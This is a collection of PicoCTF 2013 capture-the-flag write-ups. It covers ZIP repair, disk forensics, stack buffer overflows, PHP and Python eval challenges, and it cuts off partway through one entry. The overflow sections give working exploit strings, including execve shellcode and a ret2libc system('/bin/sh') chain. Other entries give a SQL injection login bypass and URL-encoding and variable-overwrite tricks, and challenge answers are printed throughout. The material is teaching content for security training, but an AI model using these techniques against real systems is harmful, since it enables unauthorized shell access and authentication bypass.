Username: admin Hash: bad_code_and_databases_is_no_fun
```

**Answer:** bad_code_and_databases_is_no_fun

## Other write-ups and resources

* none yet# PicoCTF 2013: NAVSAT

**Category:** Forensic
**Points:** 70
**Description:**

> Near the Sun, you find a malfunctioning warp beacon which is broadcasting a distress signal in a navigational channel. It looks like it's been damaged by solar radiation, and [some of its data](https://2013.picoctf.com/problems/recovery.zip) have been corrupted. If you can recover it, perhaps it will point at you to something interesting.
>
> [Offline file](recovery.zip)

## Write-up

Open with Winrar, we can see "key.txt". But extract file is error.

```
! [...]\NAVSAT\recovery.zip: The archive is corrupt
```

View file in hex:

```
00000000  3F 3F 03 04 0A 00 00 00 00 00 22 79 8E 42 F6 7D  ??........"yŽBö}
00000010  2E EF 1B 00 00 00 1B 00 00 00 0F 00 1C 00 4D 61  .ï............Ma
00000020  67 37 2D 42 57 2F 6B 65 79 2E 74 78 74 55 54 09  g7-BW/key.txtUT.
00000030  00 03 D0 FE 6A 51 0B FF 6A 51 75 78 0B 00 01 04  ..ÐþjQ.ÿjQux....
00000040  E8 03 00 00 04 E8 03 00 00 4B 65 79 3A 20 4E 65  è....è...Key: Ne
00000050  78 74 20 73 74 6F 70 20 54 61 75 20 45 72 69 64  xt stop Tau Erid
00000060  61 6E 69 0A 50 4B 03 04 14 00 00 00 08 00 27 B6  ani.PK........'¶
00000070  47 32 1B A6 C8 9C E4 52 04 00 8C 36 05 00 14 00  G2.¦ÈœäR..Œ6....
00000080  1C 00 4D 61 67 37 2D 42 57 2F 43 68 61 72 74 2D  ..Mag7-BW/Chart-
00000090  31 35 2E 70 64 66 55 54 09 00 03 BA 36 08 42 AF  15.pdfUT...º6.B¯
```

Now, contents of key.txt is display.

```
00000040  E8 03 00 00 04 E8 03 00 00 4B 65 79 3A 20 4E 65  è....è...Key: Ne
00000050  78 74 20 73 74 6F 70 20 54 61 75 20 45 72 69 64  xt stop Tau Erid
00000060  61 6E 69 0A 50 4B 03 04 14 00 00 00 08 00 27 B6  ani.PK........'¶
```

Other way, we can determine file signature ZIP is `50 4B 03 04`, `3F 3F 03 04` is corrupt signature.

We can edit 2 byte first to fix. Then, open with Winrar, extract is ok.

**Answer:** Next stop Tau Eridani

## Other write-ups and resources

* none yet# PicoCTF 2013: Overflow 1

**Category:** Binary Exploitation
**Points:** 90
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_1_3948d17028101c40 , downloadable [here](https://2013.picoctf.com/problems/overflow1-3948d17028101c40) with source
>[here](https://2013.picoctf.com/problems/overflow1-3948d17028101c40.c).

>If you solve the problem you will be able to read the key file by running

> cat /problems/stack_overflow_1_3948d17028101c40/key

>on the PicoCTF shell machine

>**Hint:**n general, the compiler will put things on the stack in the order
>they appear in the code. Also google 'endianness'

## Write-up

Looking at the source, we can see a few things:
```C
void vuln(int tmp, char *str) {
    int win = tmp;
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &tmp);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```

First, our input is a command line argument to the program. Second, if we can
set the win variable equal to 1, we'll get a shell! Let's dive in.

```
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "B"')
Stack dump:
0xffa81994: 0xffa82845 (second argument)
0xffa81990: 0x00000000 (first argument)
0xffa8198c: 0x0804870f (saved eip)
0xffa81988: 0xffa819b8 (saved ebp)
0xffa81984: 0xf779c000
0xffa81980: 0xf76a8a00
0xffa8197c: 0x00000042
0xffa81978: 0x41414141
0xffa81974: 0x41414141
0xffa81970: 0x41414141
0xffa8196c: 0x41414141
0xffa81968: 0x41414141
0xffa81964: 0x41414141
0xffa81960: 0x41414141
0xffa8195c: 0x41414141
0xffa81958: 0x41414141
0xffa81954: 0x41414141
0xffa81950: 0x41414141
0xffa8194c: 0x41414141
0xffa81948: 0x41414141
0xffa81944: 0x41414141
0xffa81940: 0x41414141
0xffa8193c: 0x41414141 (beginning of buffer)
win = 66
Sorry, you lose.
```
You'll see that if we fill up our buffer ("A"\*64) and andd one more letter,
the value of win gets changed. For those of you who don't know, the ascii value
of "B" is 66, meaning we have control over the win variable. All we have to do
is submit a character with an ascii value of 1. Since this isn't printable,
we're going to use escape sequences in python.
```
$ ./overflow1-3948d17028101c40 $(python -c 'print "A"*64 + "\x01"')
Stack dump:
0xff828874: 0xff829848 (second argument)
0xff828870: 0x00000000 (first argument)
0xff82886c: 0x0804870f (saved eip)
0xff828868: 0xff828898 (saved ebp)
0xff828864: 0xf77b7000
0xff828860: 0xf76c3aa7
0xff82885c: 0x00000001
0xff828858: 0x41414141
0xff828854: 0x41414141
0xff828850: 0x41414141
0xff82884c: 0x41414141
0xff828848: 0x41414141
0xff828844: 0x41414141
0xff828840: 0x41414141
0xff82883c: 0x41414141
0xff828838: 0x41414141
0xff828834: 0x41414141
0xff828830: 0x41414141
0xff82882c: 0x41414141
0xff828828: 0x41414141
0xff828824: 0x41414141
0xff828820: 0x41414141
0xff82881c: 0x41414141 (beginning of buffer)
win = 1
$
```

The "\x01" in python is just a way for us to supply a non printable character.


## Other write-ups and resources

* none yet
# PicoCTF 2013: Overflow 2

**Category:** Binary Exploitation
**Points:** 100
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_2_44e63640e033ff2b , downloadable [here](https://2013.picoctf.com/problems/overflow2-44e63640e033ff2b) with source
>[here](https://2013.picoctf.com/problems/overflow2-44e63640e033ff2b.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_2_44e63640e033ff2b/key
>on the PicoCTF shell machine.

>**Hint:** A function's arguments live on top of its stack frame, above its
>saved ebp and return address. Make sure not to clobber those, though...


## Write-up
Looking at the source, this problem is nearly identical to Overflow 1
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int win, char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &win);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
```
All we have to do is set win equal to 1 and we get a shell. Let's try filling
up our buffer and writing one more character.

```
$(python -c 'print "A"*64 + "B"')
Stack dump:
0xffe0c7a8: 0x000003e8
0xffe0c7a4: 0xffe0d848 (second argument)
0xffe0c7a0: 0x00000000 (first argument)
0xffe0c79c: 0x0804870b (saved eip)
0xffe0c798: 0xffe0c7c8 (saved ebp)
0xffe0c794: 0xf773c000
0xffe0c790: 0xf7640042
0xffe0c78c: 0x41414141
0xffe0c788: 0x41414141
0xffe0c784: 0x41414141
0xffe0c780: 0x41414141
0xffe0c77c: 0x41414141
0xffe0c778: 0x41414141
0xffe0c774: 0x41414141
0xffe0c770: 0x41414141
0xffe0c76c: 0x41414141
0xffe0c768: 0x41414141
0xffe0c764: 0x41414141
0xffe0c760: 0x41414141
0xffe0c75c: 0x41414141
0xffe0c758: 0x41414141
0xffe0c754: 0x41414141
0xffe0c750: 0x41414141 (beginning of buffer)
win = 0
Sorry, you lose.
```
It didn't quite work that time, but all we need is 16 more characters after 
our buffer and "\x01" to get a shell!
```
$ ./overflow2-44e63640e033ff2b $(python -c 'print "A"*64 + "B"*16 + "\x01"')
Stack dump:
0xff915b18: 0x000003e8
0xff915b14: 0xff917838 (second argument)
0xff915b10: 0x00000001 (first argument)
0xff915b0c: 0x42424242 (saved eip)
0xff915b08: 0x42424242 (saved ebp)
0xff915b04: 0x42424242
0xff915b00: 0x42424242
0xff915afc: 0x41414141
0xff915af8: 0x41414141
0xff915af4: 0x41414141
0xff915af0: 0x41414141
0xff915aec: 0x41414141
0xff915ae8: 0x41414141
0xff915ae4: 0x41414141
0xff915ae0: 0x41414141
0xff915adc: 0x41414141
0xff915ad8: 0x41414141
0xff915ad4: 0x41414141
0xff915ad0: 0x41414141
0xff915acc: 0x41414141
0xff915ac8: 0x41414141
0xff915ac4: 0x41414141
0xff915ac0: 0x41414141 (beginning of buffer)
win = 1
$
```
The hint said not to clobber the saved ebp and eip arguments, but those don't
matter for this problem. You'll get a shell before the `ret` instruction
occurs, so you don't have to worry :)

pwn.

## Other write-ups and resources

* none yet
## PicoCTF 2013: Overflow 3

**Category:** Binary Exploitation
**Points:** 120
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_3_28d8a442fb232c0c , downloadable [here](https://2013.picoctf.com/problems/overflow3-28d8a442fb232c0c) with source
>[here](https://2013.picoctf.com/problems/overflow3-28d8a442fb232c0c.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_3_28d8a442fb232c0c/key
>on the PicoCTF shell machine.

>**Hint:** objdump -d is a handy tool for this sort of thing.

## Write-up
Let's look at the source code:

```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run this function.
 */
void shell(void) {
    execl("/bin/sh", "sh", NULL);
}

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    printf("shell function = %p\n", shell);
    vuln(argv[1]);
    return 0;
}
```
Well the code comment makes it fairly plain that we need to call `shell()`

But how? Well let's just put in a bunch of garbage and see what happens:
```
$ ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*64')
shell function = 0x80485f8
Stack dump:
0xffe9fd00: 0xffea0849 (first argument)
0xffe9fcfc: 0x080486bc (saved eip)
0xffe9fcf8: 0xffe9fd28 (saved ebp)
0xffe9fcf4: 0xf7722938
0xffe9fcf0: 0x08048800
0xffe9fcec: 0x41414141
0xffe9fce8: 0x41414141
0xffe9fce4: 0x41414141
0xffe9fce0: 0x41414141
0xffe9fcdc: 0x41414141
0xffe9fcd8: 0x41414141
0xffe9fcd4: 0x41414141
0xffe9fcd0: 0x41414141
0xffe9fccc: 0x41414141
0xffe9fcc8: 0x41414141
0xffe9fcc4: 0x41414141
0xffe9fcc0: 0x41414141
0xffe9fcbc: 0x41414141
0xffe9fcb8: 0x41414141
0xffe9fcb4: 0x41414141
0xffe9fcb0: 0x41414141 (beginning of buffer)
$ strace ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*76 +"BBBB"')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
Now you'll notice that the program segfaults at 0x42424242, meaning we have
control over some part of the program. If you look at the prior stackdump,
you'll see a "saved eip." This is called a return address, and it tells the
code where to jump back to after the current function returns. In this case, it
goes back to 0x080486bc in `main()`. However, in the second run, using strace
reveals that we can overwrite that address. Maybe we can supply our own?

Let's use objdump like the hint says:
```
$ objdump -d overflow3-28d8a442fb232c0c | grep ">:"
0804837c <_init>:
080483b0 <setresuid@plt-0x10>:
080483c0 <setresuid@plt>:
080483d0 <printf@plt>:
080483e0 <geteuid@plt>:
080483f0 <strcpy@plt>:
08048400 <puts@plt>:
08048410 <__gmon_start__@plt>:
08048420 <__libc_start_main@plt>:
08048430 <putchar@plt>:
08048440 <execl@plt>:
08048450 <_start>:
08048480 <__do_global_dtors_aux>:
080484e0 <frame_dummy>:
08048504 <dump_stack>:
080485f8 <shell>:
0804861c <vuln>:
08048650 <main>:
080486d0 <__libc_csu_init>:
08048740 <__libc_csu_fini>:
08048742 <__i686.get_pc_thunk.bx>:
08048750 <__do_global_ctors_aux>:
0804877c <_fini>:
```

These are all functions in the binary, and their addresses are on the left. If
you look through them, you'll see that the `shell()` function is in there. Now
if you don't know what endianness is, I suggest you look it up. However for our
purposes, it means that the address's bytes are reversed (two hex digits). x86
is little endian, meaning all addresses in future exploits will need this.

Ex: 08 04 85 f8 becomes f8 85 04 08.

Now since we can't print all these characters, we can use a python escape
sequence to supply them. Remember the "B"s from before overwrote eip, so we
will replace those with our address!

```
$ ./overflow3-28d8a442fb232c0c $(python -c 'print "A"*76 +"\xf8\x85\x04\x08"')
shell function = 0x80485f8
Stack dump:
0xfffd4510: 0xfffd5800 (first argument)
0xfffd450c: 0x080485f8 (saved eip)
0xfffd4508: 0x41414141 (saved ebp)
0xfffd4504: 0x41414141
0xfffd4500: 0x41414141
0xfffd44fc: 0x41414141
0xfffd44f8: 0x41414141
0xfffd44f4: 0x41414141
0xfffd44f0: 0x41414141
0xfffd44ec: 0x41414141
0xfffd44e8: 0x41414141
0xfffd44e4: 0x41414141
0xfffd44e0: 0x41414141
0xfffd44dc: 0x41414141
0xfffd44d8: 0x41414141
0xfffd44d4: 0x41414141
0xfffd44d0: 0x41414141
0xfffd44cc: 0x41414141
0xfffd44c8: 0x41414141
0xfffd44c4: 0x41414141
0xfffd44c0: 0x41414141 (beginning of buffer)
$
```
pwn.

## Other write-ups and resources

* none yet
# PicoCTF 2013: Overflow 4

**Category:** Binary Exploitation
**Points:** 150
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_4_4834efeff17abdfb , downloadable [here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb) with source
>[here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_4_4834efeff17abdfb/key
>on the PicoCTF shell machine.

>**HINT:**  Gonna need some [shellcode](http://en.wikipedia.org/wiki/Shellcode). Luckily some is provided for you in the
>directory on the shell machine.

## Write-up

Let's look at the source:
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"


/*
 * Goal: Get the program to run a shell.
 */

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow_shellcode [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(argv[1]);
    return 0;
}
```

No convenient functions, and no calls to system are given to us. This means
that we need to get shellcode to run.

**Disclaimer: I've spoken to people who solved this during the actual contest. They
said that using ulimit to solve this problem was encouraged and/or hinted at by
the creators. In addition, I haven't been able to exploit it with ASLR
enabled.**

Now that that's out of the way, the first thing we do is find the offset before
we hijack `eip`

```
$ ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76 + "BBBB"')

Stack dump:
0xffc3b180: 0xffc3c800 (first argument)
0xffc3b17c: 0x42424242 (saved eip)
0xffc3b178: 0x41414141 (saved ebp)
0xffc3b174: 0x41414141
0xffc3b170: 0x41414141
0xffc3b16c: 0x41414141
0xffc3b168: 0x41414141
0xffc3b164: 0x41414141
0xffc3b160: 0x41414141
0xffc3b15c: 0x41414141
0xffc3b158: 0x41414141
0xffc3b154: 0x41414141
0xffc3b150: 0x41414141
0xffc3b14c: 0x41414141
0xffc3b148: 0x41414141
0xffc3b144: 0x41414141
0xffc3b140: 0x41414141
0xffc3b13c: 0x41414141
0xffc3b138: 0x41414141
0xffc3b134: 0x41414141
0xffc3b130: 0x41414141 (beginning of buffer)
Segmentation fault (core dumped)
```

Now if you didn't read up on shellcode (go do it!) then here's the gist:
shellcode is a general name for assembly code that does what you want it to.
Some are forkbombs, some are connect back, this one just uses a `syscall` to
get us a shell. Regardless of what it does, if you have the address where the
shellcode is stored, you can put that into `%eip` to run it. Let's disable ASLR
so we have constant stack addresses.

```
$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76
+ "BBBB"')
Stack dump:
0xffffd660: 0xffffd800 (first argument)
0xffffd65c: 0x42424242 (saved eip)
0xffffd658: 0x41414141 (saved ebp)
0xffffd654: 0x41414141
0xffffd650: 0x41414141
0xffffd64c: 0x41414141
0xffffd648: 0x41414141
0xffffd644: 0x41414141
0xffffd640: 0x41414141
0xffffd63c: 0x41414141
0xffffd638: 0x41414141
0xffffd634: 0x41414141
0xffffd630: 0x41414141
0xffffd62c: 0x41414141
0xffffd628: 0x41414141
0xffffd624: 0x41414141
0xffffd620: 0x41414141
0xffffd61c: 0x41414141
0xffffd618: 0x41414141
0xffffd614: 0x41414141
0xffffd610: 0x41414141 (beginning of buffer)
Segmentation fault (core dumped)
```
If you run this command multiple times, you will see that the addresses on the
left won't change from run to run. We've disabled ASLR. Now here's the plan to
get a shell. Since we know the address of our buffer, 0xffffd610, we can
reliably jump to it. We can put the shellcode in the first part of our buffer,
and then supply the address to `%eip` hopefully giving us a shell! (The length
of the shellcode I usually use is 21 bytes)

```
$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+ "A"*(76-21) + "\x10\xd6\xff\xff"')
Stack dump:
0xffffd660: 0xffffd800 (first argument)
0xffffd65c: 0xffffd610 (saved eip)
0xffffd658: 0x41414141 (saved ebp)
0xffffd654: 0x41414141
0xffffd650: 0x41414141
0xffffd64c: 0x41414141
0xffffd648: 0x41414141
0xffffd644: 0x41414141
0xffffd640: 0x41414141
0xffffd63c: 0x41414141
0xffffd638: 0x41414141
0xffffd634: 0x41414141
0xffffd630: 0x41414141
0xffffd62c: 0x41414141
0xffffd628: 0x41414141
0xffffd624: 0x41414180
0xffffd620: 0xcde3896e
0xffffd61c: 0x69622f68
0xffffd618: 0x68732f2f
0xffffd614: 0x68510bb0
0xffffd610: 0xe1f7c931 (beginning of buffer)
$
```

pwn.

## Other write-ups and resources

* none yet
# PicoCTF 2013: Overflow 5

**Category:** Binary Exploitation
**Points:** 190
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_5_0353c1a83cb2fa0d , downloadable [here](https://2013.picoctf.com/problems/overflow5-0353c1a83cb2fa0d). Source is not
>available for this problem.

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_5_0353c1a83cb2fa0d/key
>on the PicoCTF shell machine.

>**Hint:** Now you don't have source, and you aren't allowed to execute code
>on the stack. Keep calm and objdump -d


## Write-up
**Disclaimer: I've spoken to people who solved this during the actual contest. They
said that using ulimit to solve this problem was encouraged and/or hinted at by
the creators. In addition, I haven't been able to exploit it with ASLR
enabled.**

**Disclaimer 2: While the technique will remain the same, solving this on the
server will yield very different results.**

No source. The first thing we should do is just find the offset to hijack `%eip`
```
$ strace ./overflow5-0353c1a83cb2fa0d $(python -c 'print "A"*1036 + "BBBB"')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
1036 bytes and then we have control over eip. Now what we do is use gdb with
the ASLR disabled to find the address of some important items, namely
`system()` and the address of "/bin/sh" in libc.
```
$ setarch `uname -m` -R gdb -q ./overflow5-0353c1a83cb2fa0d
Reading symbols from ./overflow5-0353c1a83cb2fa0d...(no debugging symbols
found)...done.
(gdb) b*main
Breakpoint 1 at 0x80483c0
(gdb) r
Starting program:
/vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d

Breakpoint 1, 0x080483c0 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e62190 <system>
(gdb) info proc map
process 6912
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000        0x0 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
     0x8049000  0x804a000     0x1000        0x0 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
     0x804a000  0x804b000     0x1000     0x1000 /vagrant/write-ups-2013/pico-ctf-2013/overflow-5/overflow5-0353c1a83cb2fa0d
    0xf7e21000 0xf7e22000     0x1000        0x0
    0xf7e22000 0xf7fca000   0x1a8000        0x0 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fca000 0xf7fcc000     0x2000   0x1a8000 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fcc000 0xf7fcd000     0x1000   0x1aa000 /lib/i386-linux-gnu/libc-2.19.so
    0xf7fcd000 0xf7fd0000     0x3000        0x0
    0xf7fd9000 0xf7fdb000     0x2000        0x0
    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.19.so
    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e22000, +9999999,"/bin/sh"
0xf7f82a24
```
Now that we have the address of system and "/bin/sh" we can happily call that
function, providing /bin/sh as the argument

```
setarch `uname -m` -R  ./overflow5-0353c1a83cb2fa0d $(python -c 'print "A"*1036
+ "\x90\x21\xe6\xf7" + "JUNK" + "\x24\x2a\xf8\xf7"')
```
pwn.

## Other write-ups and resources

* none yet
# PicoCTF 2013: PHP2

**Category:** Script Exploitation
**Points:** 90
**Description:**

> We found a [simple web page](https://2013.picoctf.com/problems/php2/) that seems to want us to authenticate, but we can't figure out how... can you?

## Write-up
> In this challenge we're exploiting a simple PHP script. Our goal is to get the flag to print. 
> We can find the script's source at [https://2013.picoctf.com/problems/php2/index.phps](https://2013.picoctf.com/problems/php2/index.phps)
> Our script:

```
<?
if(eregi("admin",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
}
?>


<br><br>
Can you authenticate to this website?
<!-- source: index.phps -->
```
> The script first calls ergi() to see if the GET variable 'id' equals 'admin'. If it does then it exits . 
> The script then calls urldecode() on the 'id' variable and then checks to see if that equals 'admin'. 
> We can exploit the script by URL encoding the word 'admin' (using the chart [here](http://www.w3schools.com/tags/ref_urlencode.asp) then using the encoded word as the id variable .
> Note we also need to encode the % sign because there are one character url encodes (i.e. %8 is backspace).
> Solution:
> https://2013.picoctf.com/problems/php2/index.php?id=%2561%2564%256d%2569%256e

**Answer: b4cc845aa05ed9b0ce823cb04f253e27** 

## Other write-ups and resources

* [https://github.com/BatmansKitchen/ctf-writeups/tree/master/2013-picoctf/PHP2](https://github.com/BatmansKitchen/ctf-writeups/tree/master/2013-picoctf/PHP2)
* [https://github.com/innoying/hydrantlabs.org-old/blob/master/content/Security/picoCTF/2013/PHP2/index.jade](https://github.com/innoying/hydrantlabs.org-old/blob/master/content/Security/picoCTF/2013/PHP2/index.jade)
# PicoCTF 2013: PHP 3

**Category:** Script Exploitation
**Points:** 120
**Description:**

> It looks like [this site](http://2013.picoctf.com/problems/php3/) uses MD5 to hash passwords, but I don't think they're doing it quite right...

## Write-up
We're given the following script and the task of exploiting it to get the flag.
```
<html>
<head>
Secure Web Login
</head>
<body>
<?php
if($_POST[user] && $_POST[pass]) {
  mysql_connect("localhost","php3","xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
  mysql_select_db("php3");

  $user = $_POST[user];
  $pass = md5($_POST[pass], True);
  $query = @mysql_fetch_array(mysql_query("select user from php3 where (user='$user') and (pw='$pass')"));

  if($query[user]=="admin") {
    echo "<p>Logged in! Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
  }

  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}

?>
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.phps">Source</a>
</html>
```
> We can solve the challenge simply by putting in **admin') --** as the username and **pass** as the password.
> This converts the mySQL query in the script to treat everything after the username as a comment. Thus giving us the answer.

***Note as of 12 March 2016 , this challenge is offline. This writeup is included for learning purposes.***

**Answer: 8ab9b92c174dd483ad17cee1bb0c5bdb** 

## Other write-ups and resources

* [http://blog.phuongnam.org/2013/07/picoctf.html](http://blog.phuongnam.org/2013/07/picoctf.html)
* [https://github.com/elc1798/stuyfyre-picoctf-2013/blob/master/PHP3-120/Solution.txt](https://github.com/elc1798/stuyfyre-picoctf-2013/blob/master/PHP3-120/Solution.txt)
# PicoCTF 2013: PHP 4

**Category:** Script Exploitation
**Points:** 110
**Description:**

> It looks like our web administrators updated their MD5 code after the PHP3 fiasco. However, I still don't think they fixed all the bugs on [this site](http://2013.picoctf.com/problems/php4/).
> Can you show them what they did wrong by logging in again?

## Write-up
*None Yet*

**Answer: 50c90a07790d4d0ab7fc7f695cb61d0e** 

## Other write-ups and resources

* [http://sturzu.org/2013/05/07/picoctf-writeup-php4-110](http://sturzu.org/2013/05/07/picoctf-writeup-php4-110)
* [https://dook.biz/2015/02/picoctf-2013-php4-writeup/](https://dook.biz/2015/02/picoctf-2013-php4-writeup/)
# PicoCTF 2013: Pilot Logic

**Category:** Forensic
**Points:** 75
**Description:**

> You've gotten a [partial dump of the disk](https://2013.picoctf.com/problems/pilot_image) from the hangar's machine, and you're pretty sure the pilot's password is *cleverly hidden* somewhere within it...
>
> The disk image can be found on the shell machines at `/problems/pilot_logic.img` and the contents of the image are available in `/problems/pilot_logic/`
>
> [offline file](pilot_image)

## Write-up

Use tool [Autopsy](http://www.sleuthkit.org/autopsy/) > Create NewCase and import image file into it.

![](solve.png)

```
The pilot's passphase is "You can't take the sky from me"
```

**Answer:** You can't take the sky from me

## Other write-ups and resources

* none yet# PicoCTF 2013: Pretty Hard Programming

**Category:** Script Exploitation
**Points:** 95
**Description:**

> If you can guess the admin's password you can get a key
> [Problem](https://2013.picoctf.com/problems/php1/)[Source](https://2013.picoctf.com/problems/php1/index.phps)

## Write-up
Looking at the source code we see that we must get the password variable to match the secret_key variable.
We also notice that the variables are extracted (initialized) when we send a GET request. Changing the url to:
https://2013.picoctf.com/problems/php1/index.php?password=fakepassword&secret_key=fakepassword give us the flag.

**Answer:** php_means_youre_going_to_have_a_bad_time

## Other write-ups and resources

* none yet
# PicoCTF 2013: Python Eval 1

**Category:** Script Exploitation
**Points:** 85
**Description:**

> A wise master wishes to teach you an ancient art: [Python Eval 1](https://2013.picoctf.com/problems/pyeval/stage1.html).

## Write-up

> This challenge involves exploiting a Python input 'eval' function. 

> Our objective for this challenge is to get the following script (running at python.picoctf.com 6361) to print out the 'flag' variable.

```
# task1.py
print "Welcome to mystery math!"

flag = "xxxxxxxxxx"

while True:
  x = input("Enter number 1> ")
  x = x*x + ord(flag[0]) * ord(flag[1]) + ord(flag[2]) * x
  y = input("Enter number 2> ")
  if y / 6 + 7 - y == x:
    print "Here ya go! ", flag
    exit(0)
  else:
    print "Your lucky number is ", x - y
```

> We can see that the script uses the x and y variables as 'keys' to print out the flag and that it defines those variables with the vulnerable input function.
> After the variables have been defined, the script calculates whether they are correct using the integer representation of the flag's first three letters as an additional secret.

> Since the input function will attempt to evaluate whatever we pass it, we can make the Python interperter give us the flag by making it throw an exception. 
> Entering *int(flag)* will make the program crash with the answer.
```
Enter number 1> int(flag)
Traceback (most recent call last):
  File "/home/py1/task1.py", line 8, in <module>
    x = input("Enter number 1> ")
  File "<string>", line 1, in <module>
ValueError: invalid literal for int() with base 10: 'eval_is_best_thing_evar'
```

**Answer: eval_is_best_thing_evar** 

## Other write-ups and resources

* none yet
# PicoCTF 2013: Python Eval 2

**Category:** Script Exploitation
**Points:** 90
**Description:**

> It is recommended that you complete Python Eval 1 before trying [Python Eval 2](https://2013.picoctf.com/problems/pyeval/stage2.html).

## Write-up
>This challenge is very similiar to Python Eval 1 and also involves exploiting a Python script's input function.
> We're given the following script (running at python.picoctf.com 6362) and are expected to get the program to print out the flag variable.

```
# task2.py
from random import randint

def printpegs(code):
  print " --------------------- "
  print " |",
  for c in code:
    print c, "|",
  print ""
  print " --------------------- "

print "Master Mind Game"

flag = "xxxxxxxxxx"

mm_code = (randint(0,9), randint(0,9), randint(0,9), randint(0,9), randint(0,9))
print "I've set my code. Guess it!"

print "Rules: You should input your guesses as 5 digits separated by commas."
print "       I will respond by marking the correct digits with a 2, marking"
print "       digits in the wrong place with a 1, and marking wrong digits 0."

while True:
  guess = input('guess> ')
  if len(guess) != 5:
    print "You must guess a 5-digit code!"
    continue

  printpegs(guess)

  right = map(lambda x,y: (x == y) + (x in mm_code), guess, mm_code)
  printpegs(right)

  if guess == mm_code:
    print "You got it right!"
    exit(0)
```
> This script defines a 'guess' variable with the vulnerable input function. It then calculates wheter the guess is correct. 

